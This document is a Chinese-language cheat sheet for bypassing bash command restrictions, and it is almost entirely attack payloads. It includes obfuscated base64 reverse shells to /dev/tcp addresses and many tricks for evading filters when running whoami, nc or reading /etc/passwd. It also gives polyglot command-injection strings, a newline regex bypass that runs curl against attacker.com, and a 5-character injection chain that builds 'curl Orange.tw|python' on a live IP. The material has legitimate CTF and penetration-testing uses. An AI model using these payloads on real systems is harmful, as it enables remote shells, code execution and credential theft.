# 绕过bash命令限制

## 反向shell

```bash
echo "echo $(echo 'bash -i >& /dev/tcp/10.10.14.8/4444 0>&1' | base64 | base64)|ba''se''6''4 -''d|ba''se''64 -''d|b''a''s''h" | sed 's/ /${IFS}/g'

echo${IFS}WW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE1DNHhNQzR4TkM0NEx6UTBORFFnTUQ0bU1Rbz0K|ba''se''6''4${IFS}-''d|ba''se''64${IFS}-''d|b''a''s''h
```

## 短小的 Rev Shell

```bash
(sh)0>/dev/tcp/10.10.10.10/443
exec >&0
```

## 绕过路径和黑名单

```bash
/usr/bin/p?ng # /usr/bin/ping
nma? -p 80 localhost # /usr/bin/nmap -p 80 localhost
/usr/bin/who*mi # /usr/bin/whoami
/usr/bin/n[c] # /usr/bin/nc
'p'i'n'g # ping
"w"h"o"a"m"i # whoami
ech''o test # echo test
ech""o test # echo test
bas''e64 # base64
\u\n\a\m\e \-\a # uname -a
/\b\i\n/////s\h # /bin/sh
who$@ami # whoami
$(tr "[A-Z]" "[a-z]"<<<"WhOaMi") # whoami -> 大写转小写
$(a="WhOaMi";printf %s "${a,,}") # whoami -> 转换 (仅限bash)
$(rev<<<'imaohw') # whoami
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==) # base64
echo whoami|$0 # whoami
cat$u /etc$u/passwd$u # cat /etc/passwd
p${u}i${u}n${u}g # ping
p$(u)i$(u)n$(u)g # ping
w`u`h`u`o`u`a`u`m`u`i # whoami

通配符 + 本地目录参数
touch -- -la # 在 -- 之后停止处理选项
ls *
echo * # 使用echo和通配符列出当前文件和文件夹

使用历史记录连接字符串
!-1 # 将由最后执行的命令替换，!-2 由倒数第二个命令替换
mi # 抛出一个错误
whoa # 抛出一个错误
!-1!-2 # 执行whoami命令，由上面两条"命令"连接
```

## 空格绕过

```bash
{cat,lol.txt} # cat lol.txt
{echo,test} # echo test
cat${IFS}/etc/passwd # cat /etc/passwd
cat$IFS/etc/passwd # cat /etc/passwd

将命令放入变量中执行
IFS=];b=wget]10.10.14.21:53/lol]-P]/tmp;$b # wget
IFS=];b=cat]/etc/passwd;$b # cat /etc/passwd
IFS=,;`cat<<<cat,/etc/passwd`
echo${IFS}test

X=$'cat\x20/etc/passwd'&&$X
echo "ls\x09-l" | bash

换行
p\
i\
n\
g

未定义的变量和!
$u $u
uname!-1\-a
```

## 斜杠绕过

```bash
cat ${HOME:0:1}etc${HOME:0:1}passwd
cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
```

## 管道符绕过

```bash
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
```

## 十六进制编码绕过

```bash
echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"
cat `echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"`
abc=$'\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64';cat abc
`echo $'cat\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64'`
cat `xxd -r -p <<< 2f6574632f706173737764`
xxd -r -ps <(echo 2f6574632f706173737764)
cat `xxd -r -ps <(echo 2f6574632f706173737764)`
```

## 绕过IP限制

```bash
127.0.0.1 --> 2130706433
```

## 基于时间的数据泄露

```bash
time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
```

## 从环境变量获取字符

```bash
echo ${LS_COLORS:10:1} #;
echo ${PATH:0:1} #/
```

## 内置函数

```bash
declare builtins # 获取内置函数列表

在某些情况下，PATH不会被设置，可以尝试利用
PATH="/bin" /bin/ls
export PATH="/bin"
declare PATH="/bin"
SHELL=/bin/bash

十六进制编码
$(echo -e "\x2f\x62\x69\x6e\x2f\x6c\x73")
$(echo -e "\x2f\x62\x69\x6e\x2f\x6c\x73")

输入
read aaa; exec $aaa # 读取更多命令并执行
read aaa; eval $aaa

使用printf和环境变量获取/
printf %.1s "$PWD"
$(printf %.1s "$PWD")bin$(printf %.1s "$PWD")ls # /bin/ls
declare
declare functions
declare historywords

读取当前目录的flag
source f*
flag.txt:1: command not found: CTF{asdasdasd}

使用read读取文件
while read -r line; do echo $line; done < /etc/passwd

获取环境变量
declare

获取历史记录
history
declare history
declare historywords

禁用特殊的内置字符，以便将它们用作脚本,如禁用"["作为内置并启用它作为脚本
enable -n [
echo -e '#!/bin/bash\necho "hello!"' > /tmp/[
chmod +x [
export PATH=/tmp:$PATH
if [ "a" ]; then echo 1; fi # 输出 hello!
```

## 多语言命令注入

```bash
1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/
```

## 绕过正则表达式

```bash
仅允许字母和数字的正则表达式可能容易受到换行符的影响
1%0a`curl http://attacker.com`
```

## 5个字符的命令注入

```bash
第一种方式
步骤 1：生成 `ls -t>g` 到文件"_"，以便能够执行 ls 按创建日期排序名称
http://host/?cmd=>ls\
http://host/?cmd=ls>_
http://host/?cmd=>\ \
http://host/?cmd=>-t\
http://host/?cmd=>\>g
http://host/?cmd=ls>>_

步骤2：生成`curl Orange.tw|python`到文件"g"
通过创建必要的文件名并将该内容写入文件"g"，执行先前生成的文件
http://host/?cmd=>on
http://host/?cmd=>th\
http://host/?cmd=>py\
http://host/?cmd=>\|\
http://host/?cmd=>tw\
http://host/?cmd=>e.\
http://host/?cmd=>ng\
http://host/?cmd=>ra\
http://host/?cmd=>o\
http://host/?cmd=>\ \
http://host/?cmd=>rl\
http://host/?cmd=>cu\
http://host/?cmd=sh _
注意，每个文件名末尾都会添加一个"\\"字符，因为写入文件时"ls"会在文件名之间添加新行

最后执行文件"g"
http://host/?cmd=sh g


第二种方式
不要将脚本写入文件，而是创建按字母顺序排列的命令并使用"*"执行它
对文件夹执行 tar 命令
http://52.199.204.34/?cmd=>tar
http://52.199.204.34/?cmd=>zcf
http://52.199.204.34/?cmd=>zzz
http://52.199.204.34/?cmd=*%20/h*

读取当前文件夹的文件
ln /f*
如果有一个 /flag.txt 文件将创建硬链接在当前文件夹中
```
